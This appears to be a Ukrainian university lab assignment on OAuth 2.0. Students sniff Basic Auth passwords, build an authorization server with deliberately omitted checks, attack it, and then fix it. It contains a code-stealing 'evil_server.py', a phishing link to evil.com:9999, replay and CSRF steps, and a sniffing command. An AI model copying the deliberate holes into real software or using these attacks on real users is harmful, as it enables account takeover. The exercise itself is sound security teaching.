# Лабораторна робота 4. OAuth 2.0 — від перехоплення паролів до делегованої авторизації

**Курс:** Захист інформації
**Лекція:** 4 — Архітектура OAuth 2.0
**Максимальний бал:** 100
**Дедлайн:** визначає викладач
**Технології:** Python 3.10+, Flask, SQLite, tcpdump/Wireshark

---

## Структура оцінювання

| # | Завдання | Балів | Тип |
|---|----------|-------|-----|
| A | Перехоплення паролів (password anti-pattern) | 10 | Індивідуальне |
| 1 | Resource Server — API нотаток | 10 | Проєкт |
| 2 | Реєстрація OAuth-клієнтів | 10 | Проєкт |
| 3 | Authorization Endpoint + Consent Screen | 15 | Проєкт |
| 4 | Token Endpoint | 10 | Проєкт |
| 5 | Захищений ресурс з Bearer Token | 10 | Проєкт |
| 6 | Зовнішній Client Application | 15 | Проєкт |
| 7 | Атака на власну реалізацію | 10 | Проєкт |
| 8 | Виправлення вразливостей | 10 | Проєкт |
| **Разом** | | **100** | |

---

## Передумови

```bash
pip install flask requests
```

Для завдання A — один із інструментів:
- `tcpdump` (вбудований у macOS/Linux)
- `ngrep` (`brew install ngrep` / `apt install ngrep`)
- Wireshark (GUI)

---

## Завдання A: Перехоплення паролів (10 балів)

### Мета

Продемонструвати, чому password anti-pattern — це загроза. Студент запускає простий HTTP-сервер з Basic Auth, перехоплює credentials сніфером, і робить висновок.

### Крок 1. Створити сервер (файл `victim_server.py`)

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

USERS = {"maksym": "supersecret123"}

@app.route("/notes")
def get_notes():
    auth = request.authorization
    if not auth or USERS.get(auth.username) != auth.password:
        return "Unauthorized", 401, {"WWW-Authenticate": "Basic realm='notes'"}
    return jsonify({"notes": ["Нотатка 1", "Нотатка 2"]})

if __name__ == "__main__":
    # HTTP (не HTTPS!) — навмисно для демонстрації
    app.run(port=8080)
```

### Крок 2. Запустити сніфер

**Варіант A — tcpdump:**
```bash
sudo tcpdump -i lo0 -A -s 0 'tcp port 8080 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

**Варіант B — ngrep:**
```bash
sudo ngrep -d lo -q -W byline 'Authorization' port 8080
```

**Варіант C — Wireshark:**
Фільтр: `tcp.port == 8080 && http.authbasic`

### Крок 3. Надіслати запит

```bash
curl -u maksym:supersecret123 http://localhost:8080/notes
```

### Що здати

1. Скріншот перехопленого трафіку, де видно `Authorization: Basic bWFrc3ltOnN1cGVyc2VjcmV0MTIz`
2. Декодувати Base64: `echo "bWFrc3ltOnN1cGVyc2VjcmV0MTIz" | base64 -d`
3. Відповідь на запитання (2-3 речення): *"Чому передача паролю третьому додатку — це катастрофа, навіть якщо з'єднання через HTTPS?"*

### Критерії оцінювання

| Критерій | Балів |
|----------|-------|
| Сніфер перехопив credentials (скріншот) | 5 |
| Base64 декодовано, credentials видно | 2 |
| Відповідь на запитання (згадати: немає відкликання, повний доступ, поширення секрету) | 3 |

---

## Проєкт: OAuth 2.0 з нуля

Ви побудуєте повну реалізацію OAuth 2.0 Authorization Code Flow для додатка SecureNotes. Архітектура:

```
Порт 5000: SecureNotes (Authorization Server + Resource Server)
Порт 5001: NotesExporter (Client Application — зовнішній додаток)
```

**Важливо:** в етапах 3-5 ви навмисно пропустите деякі перевірки безпеки. В етапі 7 ви атакуєте власний сервер, а в етапі 8 — виправите вразливості. Це навчить вас, *чому* кожна перевірка існує в RFC 6749.

---

### Етап 1: Resource Server — API нотаток (10 балів)

**Мета:** створити REST API для нотаток з простою аутентифікацією (session-based).

Створіть файл `server.py`:

```python
from flask import Flask, request, jsonify, session
import sqlite3, os

app = Flask(__name__)
app.secret_key = os.urandom(32)
DATABASE = "securenotes.db"

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            title TEXT NOT NULL,
            content TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users(id)
        );
    """)
    db.close()
```

**TODO — реалізувати:**

1. `POST /register` — реєстрація користувача (username, password). Пароль зберігати як є (це спрощення; хешування було в лекції 2).
2. `POST /login` — логін, зберегти `user_id` у `session`.
3. `GET /notes` — повернути нотатки поточного користувача (потрібен логін).
4. `POST /notes` — створити нотатку (title, content).
5. `DELETE /notes/<id>` — видалити нотатку (лише власну).

**Очікуваний результат:**
```bash
# Реєстрація
curl -c cookies.txt -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"maksym","password":"secret"}'

# Логін
curl -c cookies.txt -b cookies.txt -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"maksym","password":"secret"}'

# Створити нотатку
curl -b cookies.txt -X POST http://localhost:5000/notes \
  -H "Content-Type: application/json" \
  -d '{"title":"Перша нотатка","content":"Hello OAuth"}'

# Отримати нотатки
curl -b cookies.txt http://localhost:5000/notes
# [{"id":1,"title":"Перша нотатка","content":"Hello OAuth"}]
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| Реєстрація + логін працюють | 3 |
| CRUD для нотаток (GET, POST, DELETE) | 5 |
| Нотатки ізольовані між користувачами | 2 |

---

### Етап 2: Реєстрація OAuth-клієнтів (10 балів)

**Мета:** дозволити стороннім додаткам реєструватися як OAuth-клієнти.

**TODO:**

1. Додати таблицю до БД:

```sql
CREATE TABLE IF NOT EXISTS oauth_clients (
    client_id TEXT PRIMARY KEY,
    client_secret TEXT NOT NULL,
    redirect_uri TEXT NOT NULL,
    name TEXT NOT NULL
);
```

2. Реалізувати `POST /oauth/clients`:

```python
import secrets

# POST /oauth/clients
# Body: {"name": "NotesExporter", "redirect_uri": "http://localhost:5001/callback"}
# Response: {"client_id": "...", "client_secret": "..."}
```

- `client_id` = `secrets.token_hex(16)`
- `client_secret` = `secrets.token_hex(32)`
- Зберегти в таблицю `oauth_clients`

3. Реалізувати `GET /oauth/clients` (для налагодження) — повернути список зареєстрованих клієнтів (**без** `client_secret`).

**Очікуваний результат:**
```bash
curl -X POST http://localhost:5000/oauth/clients \
  -H "Content-Type: application/json" \
  -d '{"name":"NotesExporter","redirect_uri":"http://localhost:5001/callback"}'
# {"client_id":"a1b2c3d4e5f6...","client_secret":"9f8e7d6c5b4a..."}
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| Таблиця створюється при старті | 2 |
| POST /oauth/clients генерує client_id + client_secret | 4 |
| Використано secrets (не random) | 2 |
| GET /oauth/clients не повертає client_secret | 2 |

---

### Етап 3: Authorization Endpoint + Consent Screen (15 балів)

**Мета:** реалізувати сторінку згоди (consent) та генерацію authorization code.

**УВАГА: навмисні пропуски безпеки (НЕ виправляти зараз):**
- НЕ перевіряти `redirect_uri` проти зареєстрованого в `oauth_clients`
- НЕ вимагати параметр `state`
- Authorization code без обмеження часу

Ці вразливості ви будете експлуатувати в етапі 7.

**TODO:**

1. Додати таблицю:

```sql
CREATE TABLE IF NOT EXISTS authorization_codes (
    code TEXT PRIMARY KEY,
    client_id TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    scope TEXT NOT NULL,
    redirect_uri TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

2. `GET /oauth/authorize?client_id=CID&redirect_uri=URI&scope=notes:read&state=XYZ`
   - Перевірити, що `client_id` існує
   - Перевірити, що користувач залогінений (інакше — redirect на `/login`)
   - Показати HTML-сторінку згоди з назвою додатка та запитаними scopes
   - **НЕ перевіряти redirect_uri** (навмисна вразливість!)

3. `POST /oauth/authorize` — обробка форми:
   - При "Дозволити": згенерувати `code = secrets.token_urlsafe(32)`, зберегти в БД, redirect на `redirect_uri?code=CODE&state=STATE`
   - При "Відхилити": redirect на `redirect_uri?error=access_denied&state=STATE`
   - **НЕ перевіряти state** (навмисна вразливість!)

**Consent screen (мінімальний HTML):**

```html
<h2>SecureNotes Authorization</h2>
<p>Додаток <b>{{ client_name }}</b> запитує доступ:</p>
<ul>
{% for s in scopes %}
  <li>{{ s }}</li>
{% endfor %}
</ul>
<form method="POST" action="/oauth/authorize">
    <input type="hidden" name="client_id" value="{{ client_id }}">
    <input type="hidden" name="redirect_uri" value="{{ redirect_uri }}">
    <input type="hidden" name="scope" value="{{ scope }}">
    <input type="hidden" name="state" value="{{ state }}">
    <button name="consent" value="allow" style="background:green;color:white;padding:10px 20px">Дозволити</button>
    <button name="consent" value="deny" style="background:red;color:white;padding:10px 20px">Відхилити</button>
</form>
```

**Очікуваний результат:**

Відкрити в браузері (після логіну):
```
http://localhost:5000/oauth/authorize?client_id=CID&redirect_uri=http://localhost:5001/callback&scope=notes:read&state=abc123
```
Натиснути "Дозволити" → redirect на:
```
http://localhost:5001/callback?code=LONG_RANDOM_CODE&state=abc123
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| GET /oauth/authorize показує consent screen | 4 |
| Перевірка що client_id існує | 2 |
| Перевірка що користувач залогінений | 2 |
| POST генерує code і робить redirect | 4 |
| "Відхилити" повертає error=access_denied | 3 |

---

### Етап 4: Token Endpoint (10 балів)

**Мета:** обмін authorization code на access token.

**УВАГА: навмисні пропуски (НЕ виправляти зараз):**
- Authorization code можна використати **багато разів** (не видаляти після обміну)
- Токен **без терміну дії** (не додавати `expires_at`)

**TODO:**

1. Додати таблицю:

```sql
CREATE TABLE IF NOT EXISTS access_tokens (
    token TEXT PRIMARY KEY,
    client_id TEXT NOT NULL,
    user_id INTEGER NOT NULL,
    scope TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

2. `POST /oauth/token` з `grant_type=authorization_code`:
   - Прийняти параметри: `grant_type`, `code`, `client_id`, `client_secret`
   - Перевірити `client_id` + `client_secret`
   - Перевірити що `code` існує і належить цьому `client_id`
   - Згенерувати `access_token = secrets.token_urlsafe(32)`
   - Зберегти в `access_tokens`
   - **НЕ видаляти code** після використання (навмисна вразливість!)
   - **НЕ додавати expires_in** (навмисна вразливість!)
   - Повернути JSON:

```json
{
  "access_token": "...",
  "token_type": "Bearer",
  "scope": "notes:read"
}
```

**Очікуваний результат:**
```bash
curl -X POST http://localhost:5000/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE_FROM_STEP_3" \
  -d "client_id=CID" \
  -d "client_secret=CSECRET"
# {"access_token":"xyz...","token_type":"Bearer","scope":"notes:read"}
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| POST /oauth/token приймає grant_type=authorization_code | 2 |
| Перевірка client_id + client_secret | 3 |
| Перевірка code (існує, належить client_id) | 3 |
| Повертає access_token у правильному форматі | 2 |

---

### Етап 5: Захищений ресурс з Bearer Token (10 балів)

**Мета:** дозволити доступ до нотаток через `Authorization: Bearer <token>` із перевіркою scopes.

**TODO:**

1. Створити декоратор або middleware `require_token(scope)`:

```python
from functools import wraps

def require_token(required_scope):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            auth_header = request.headers.get("Authorization", "")
            if not auth_header.startswith("Bearer "):
                return jsonify({"error": "missing_token"}), 401
            token = auth_header[7:]
            # TODO: знайти токен в БД
            # TODO: перевірити scope
            # TODO: передати user_id у функцію
            return f(*args, **kwargs)
        return wrapper
    return decorator
```

2. Додати новий endpoint — `GET /api/notes` (відрізняється від `/notes` — цей працює з токеном, а не з сесією):

```python
@app.route("/api/notes")
@require_token("notes:read")
def api_get_notes():
    # Повернути нотатки user_id з токена
    pass
```

3. Перевірка scopes: якщо токен має scope `notes:read`, а endpoint вимагає `notes:write` — повернути `403 Forbidden` з `{"error": "insufficient_scope"}`.

**Очікуваний результат:**
```bash
# З валідним токеном
curl -H "Authorization: Bearer ACCESS_TOKEN" http://localhost:5000/api/notes
# [{"id":1,"title":"Перша нотатка","content":"Hello OAuth"}]

# Без токена
curl http://localhost:5000/api/notes
# {"error":"missing_token"} — 401

# З невалідним токеном
curl -H "Authorization: Bearer invalid" http://localhost:5000/api/notes
# {"error":"invalid_token"} — 401
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| Bearer token витягується з заголовка | 2 |
| Токен валідується через БД | 3 |
| Scope перевіряється (notes:read vs notes:write) | 3 |
| Повертає правильні HTTP-коди (401, 403) | 2 |

---

### Етап 6: Зовнішній Client Application (15 балів)

**Мета:** створити окремий Flask-додаток на порту 5001, який виконує повний Authorization Code Flow.

Створіть файл `client_app.py`:

**TODO:**

1. Головна сторінка з кнопкою "Підключити SecureNotes":

```python
from flask import Flask, redirect, request, session, jsonify
import requests, secrets, os

app = Flask(__name__)
app.secret_key = os.urandom(32)

CLIENT_ID = "..."      # з етапу 2
CLIENT_SECRET = "..."  # з етапу 2
AUTH_SERVER = "http://localhost:5000"
REDIRECT_URI = "http://localhost:5001/callback"

@app.route("/")
def index():
    # TODO: показати кнопку "Підключити SecureNotes"
    # При натисканні — redirect на AUTH_SERVER/oauth/authorize
    pass
```

2. `/connect` — redirect на authorization server:
   - Згенерувати `state = secrets.token_urlsafe(16)`, зберегти в `session["oauth_state"]`
   - Redirect на: `AUTH_SERVER/oauth/authorize?client_id=...&redirect_uri=...&scope=notes:read&state=...`

3. `/callback` — обробка відповіді:
   - Отримати `code` та `state` з query parameters
   - Обміняти `code` на `access_token` через POST на `AUTH_SERVER/oauth/token`
   - Зберегти `access_token` у session

4. `/notes` — показати нотатки користувача:
   - Зробити GET `AUTH_SERVER/api/notes` з `Authorization: Bearer <token>`
   - Показати результат

**Очікуваний сценарій (повний flow):**

```
1. Відкрити http://localhost:5001/
2. Натиснути "Підключити SecureNotes"
3. → Redirect на http://localhost:5000/oauth/authorize?...
4. Залогінитись (якщо ще не залогінений)
5. Побачити consent screen → натиснути "Дозволити"
6. → Redirect на http://localhost:5001/callback?code=...&state=...
7. Client обмінює code на token (back-channel)
8. → Redirect на http://localhost:5001/notes
9. Побачити нотатки Максима, отримані через OAuth!
```

**Критерії:**

| Критерій | Балів |
|----------|-------|
| /connect генерує state і робить redirect | 3 |
| /callback отримує code і обмінює на token | 5 |
| /notes показує нотатки через Bearer token | 4 |
| Повний flow працює end-to-end (демонстрація) | 3 |

---

### Етап 7: Атака на власну реалізацію (10 балів)

**Мета:** знайти та експлуатувати вразливості, які ви навмисно залишили в етапах 3-4.

Для кожної атаки студент має:
- Описати вразливість (2-3 речення)
- Показати proof-of-concept (команда або скрипт)
- Пояснити наслідки для реального користувача

**Атака 1: Open Redirect (відсутня валідація redirect_uri)**

Ваш сервер не перевіряє, чи `redirect_uri` збігається із зареєстрованим. Атакуючий може підставити свій URL:

```bash
# Зловмисник надсилає жертві таке посилання:
http://localhost:5000/oauth/authorize?client_id=REAL_CID&redirect_uri=http://evil.com:9999/steal&scope=notes:read&state=x
```

**TODO:** Створити `evil_server.py` на порту 9999, який перехоплює authorization code:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/steal")
def steal():
    code = request.args.get("code")
    print(f"[STOLEN] Authorization code: {code}")
    return "Дякуємо за авторизацію! (це фішинг)"

if __name__ == "__main__":
    app.run(port=9999)
```

Пройти flow через браузер — показати, що code потрапив на evil_server.

**Атака 2: CSRF (відсутній state parameter)**

Атакуючий може створити посилання, яке прив'яже свій акаунт до сесії жертви:

```bash
# Зловмисник сам проходить flow, отримує code, але не використовує його.
# Потім надсилає жертві пряме посилання:
http://localhost:5001/callback?code=ATTACKERS_CODE
# Якщо client_app не перевіряє state — жертва працює з акаунтом зловмисника!
```

**TODO:** Описати сценарій атаки та показати, що `/callback` приймає будь-який code без перевірки state.

**Атака 3: Повторне використання authorization code**

```bash
# Обміняти code на token
curl -X POST http://localhost:5000/oauth/token -d "grant_type=authorization_code&code=THE_CODE&client_id=CID&client_secret=CSECRET"
# Отримали token!

# Обміняти ТОЙ САМИЙ code ще раз
curl -X POST http://localhost:5000/oauth/token -d "grant_type=authorization_code&code=THE_CODE&client_id=CID&client_secret=CSECRET"
# Отримали ДРУГИЙ token! Це вразливість — code повинен бути одноразовим.
```

**Атака 4: Вічний токен**

```bash
# Токен працює без обмеження часу
curl -H "Authorization: Bearer OLD_TOKEN" http://localhost:5000/api/notes
# Навіть через годину/день/тиждень — все ще працює
```

**TODO:** Описати, чому це проблема (якщо токен вкрадено — доступ назавжди).

**Критерії:**

| Критерій | Балів |
|----------|-------|
| Open Redirect: evil_server перехоплює code (скріншот) | 3 |
| CSRF: показано що callback приймає чужий code | 3 |
| Replay: code використано двічі, два різних токени | 2 |
| Вічний токен: описано загрозу | 2 |

---

### Етап 8: Виправлення вразливостей (10 балів)

**Мета:** закрити всі вразливості з етапу 7.

**Виправлення 1: Валідація redirect_uri (exact match)**

```python
# В GET /oauth/authorize:
client = db.execute("SELECT * FROM oauth_clients WHERE client_id=?", (client_id,)).fetchone()
if client["redirect_uri"] != redirect_uri:
    return jsonify({"error": "invalid_redirect_uri"}), 400
# НЕ робити redirect на невідомий URI!
```

**Виправлення 2: Обов'язковий state + перевірка**

На сервері — передавати `state` як є (це відповідальність клієнта). В `client_app.py`:

```python
# /callback
if request.args.get("state") != session.get("oauth_state"):
    return "CSRF detected!", 403
```

**Виправлення 3: Одноразовий authorization code**

```python
# В POST /oauth/token, ПІСЛЯ успішного обміну:
db.execute("DELETE FROM authorization_codes WHERE code=?", (code,))
db.commit()
```

**Виправлення 4: Термін дії токена**

```python
# Додати expires_at до access_tokens
# При створенні:
expires_at = datetime.utcnow() + timedelta(minutes=15)

# При валідації:
if token_row["expires_at"] < datetime.utcnow().isoformat():
    return jsonify({"error": "token_expired"}), 401

# В response:
{"access_token": "...", "token_type": "Bearer", "expires_in": 900}
```

**TODO:** Застосувати всі 4 виправлення та підтвердити, що атаки з етапу 7 більше не працюють.

**Критерії:**

| Критерій | Балів |
|----------|-------|
| redirect_uri перевіряється (exact match), open redirect не працює | 3 |
| state перевіряється у client_app, CSRF заблоковано | 3 |
| Code одноразовий — повторний обмін повертає помилку | 2 |
| Токен має expiry, після 15 хв — 401 | 2 |

---

## Формат здачі

1. **Завдання A:** скріншоти + текстова відповідь (PDF або Markdown)
2. **Проєкт (етапи 1-8):** Git-репозиторій з комітами по етапах:
   - Кожен етап = окремий коміт (або серія комітів)
   - README.md з інструкцією запуску
   - Скріншоти/відео для етапів 6-8 (демонстрація flow, атак, виправлень)

**Структура репозиторію:**

```
oauth-lab/
    server.py              # SecureNotes (порт 5000)
    client_app.py           # NotesExporter (порт 5001)
    evil_server.py          # Зловмисний сервер (порт 9999, етап 7)
    victim_server.py        # Завдання A
    securenotes.db          # SQLite (автостворення)
    README.md
    screenshots/
        task-a-sniff.png
        stage6-flow.png
        stage7-open-redirect.png
        stage7-csrf.png
        stage8-fixed.png
```

---

## Підказки

- Для тестування flow у двох серверах одночасно: відкрийте два термінали, запустіть `python server.py` та `python client_app.py`.
- Flask sessions використовують cookies — для тестування в одному браузері обидва сервери мають бути на різних портах (localhost:5000 і localhost:5001).
- Використовуйте `print()` або `app.logger.info()` для відладки — дивіться, які параметри приходять у кожен endpoint.
- Якщо загубились — перечитайте RFC 6749 Section 4.1 (Authorization Code Grant).
